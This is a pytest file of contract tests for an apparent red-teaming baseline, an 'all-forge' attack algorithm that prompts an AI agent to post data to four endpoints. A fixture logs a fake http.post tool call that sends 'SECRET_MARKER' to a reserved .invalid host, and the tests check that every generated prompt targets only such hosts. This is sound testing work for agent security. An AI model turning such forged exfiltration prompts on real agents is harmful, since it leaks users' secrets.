"""Contract tests for B023 all-forge live fill."""

import importlib.util
import sys
import types
from dataclasses import dataclass
from pathlib import Path

import pytest

B008R_ATTACK_PATH = Path("baselines/replaysafe_classify5_v1/attack.py")
B023_ATTACK_PATH = Path("baselines/replaysafe_allforge_v1/attack.py")


class FakeCandidate:
    def __init__(self, user_messages):
        self.user_messages = tuple(user_messages)

    @classmethod
    def from_messages(cls, user_messages):
        return cls(user_messages)


@dataclass
class FakeConfig:
    time_budget_s: float = 500.0
    max_tool_hops: int = 8


class FakeClock:
    def __init__(self) -> None:
        self.now = 0.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


@pytest.fixture(autouse=True)
def sdk_stubs(monkeypatch: pytest.MonkeyPatch) -> None:
    attacks = types.ModuleType("aicomp_sdk.attacks")
    attacks.AttackAlgorithmBase = type("AttackAlgorithmBase", (), {})
    attacks.AttackCandidate = FakeCandidate
    attacks.AttackRunConfig = FakeConfig
    contracts = types.ModuleType("aicomp_sdk.attacks.contracts")
    contracts.AttackAlgorithmBase = attacks.AttackAlgorithmBase
    contracts.AttackCandidate = FakeCandidate
    contracts.AttackRunConfig = FakeConfig
    monkeypatch.setitem(sys.modules, "aicomp_sdk", types.ModuleType("aicomp_sdk"))
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks", attacks)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks.contracts", contracts)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.core", types.ModuleType("aicomp_sdk.core"))


def _load_attack(path: Path, module_name: str):
    spec = importlib.util.spec_from_file_location(module_name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class FiringEnv:
    def __init__(self, clock: FakeClock, *, latency_s: float) -> None:
        self.clock = clock
        self.latency_s = latency_s
        self.messages: list[str] = []
        self.hops: list[int] = []

    def reset(self) -> None:
        pass

    def interact(self, message: str, *, max_tool_hops: int) -> None:
        self.messages.append(message)
        self.hops.append(max_tool_hops)
        self.clock.advance(self.latency_s)

    def export_trace_dict(self):
        return {
            "tool_events": [
                {
                    "name": "http.post",
                    "ok": True,
                    "args": {"url": "http://fixture.invalid", "data": "SECRET_MARKER"},
                }
            ]
        }


def test_b023_always_forges_and_keeps_envelope_constants() -> None:
    parent = _load_attack(B008R_ATTACK_PATH, "classify5_for_b023")
    child = _load_attack(B023_ATTACK_PATH, "allforge_attack")
    assert child.ALWAYS_FORGE is True
    assert not hasattr(parent, "ALWAYS_FORGE")
    assert child.SLOW_MULTIPOST_N == parent.SLOW_MULTIPOST_N == 4
    assert child.SPLIT_CLASSIFY_N == parent.SPLIT_CLASSIFY_N == 5
    assert child.REPLAY_SAFE_FRAC == parent.REPLAY_SAFE_FRAC == 0.99
    assert child.PROBE_HOPS == parent.PROBE_HOPS == 0
    assert child.BURST_K == parent.BURST_K == 1
    assert child.TEMPLATE == parent.TEMPLATE
    assert child._url(0).endswith(".invalid")


def test_fast_row_is_four_endpoint_forge(monkeypatch: pytest.MonkeyPatch) -> None:
    child = _load_attack(B023_ATTACK_PATH, "allforge_fast")
    clock = FakeClock()
    monkeypatch.setattr(child.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=5.0)
    candidates = child.AttackAlgorithm().run(env, FakeConfig(time_budget_s=500.0, max_tool_hops=8))
    messages = [item.user_messages[0] for item in candidates]
    assert messages
    assert all("these 4 endpoints" in msg for msg in messages)
    assert all("Call http.post once" not in msg for msg in messages)
    assert all(msg.count("http://") == 4 for msg in messages)
    assert all(".invalid" in msg for msg in messages)
    assert all(len(item.user_messages) == 1 for item in candidates)


def test_slow_row_is_four_endpoint_forge(monkeypatch: pytest.MonkeyPatch) -> None:
    child = _load_attack(B023_ATTACK_PATH, "allforge_slow")
    clock = FakeClock()
    monkeypatch.setattr(child.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=13.0)
    candidates = child.AttackAlgorithm().run(env, FakeConfig(time_budget_s=500.0, max_tool_hops=8))
    messages = [item.user_messages[0] for item in candidates]
    assert messages
    assert all("these 4 endpoints" in msg for msg in messages)
    assert all(msg.count("http://") == 4 for msg in messages)
    assert all(".co" not in msg for msg in messages)
    assert set(env.hops) == {8}


def test_same_candidate_count_as_b008r_on_slow_clock(monkeypatch: pytest.MonkeyPatch) -> None:
    parent = _load_attack(B008R_ATTACK_PATH, "classify5_allforge_count")
    child = _load_attack(B023_ATTACK_PATH, "allforge_count")
    clock_a = FakeClock()
    monkeypatch.setattr(parent.time, "monotonic", clock_a)
    parent_out = parent.AttackAlgorithm().run(
        FiringEnv(clock_a, latency_s=13.0),
        FakeConfig(time_budget_s=9000.0, max_tool_hops=8),
    )
    clock_b = FakeClock()
    monkeypatch.setattr(child.time, "monotonic", clock_b)
    child_out = child.AttackAlgorithm().run(
        FiringEnv(clock_b, latency_s=13.0),
        FakeConfig(time_budget_s=9000.0, max_tool_hops=8),
    )
    assert len(child_out) == len(parent_out)


def test_urls_stay_on_reserved_invalid_hosts() -> None:
    child = _load_attack(B023_ATTACK_PATH, "allforge_urls")
    for index in range(20):
        assert child._url(index).endswith(".invalid")
        message = child._forge_plan_message(index, child.SLOW_MULTIPOST_N)
        assert message.count(".invalid") == 4
        assert "example.com" not in message
        assert ".co" not in message
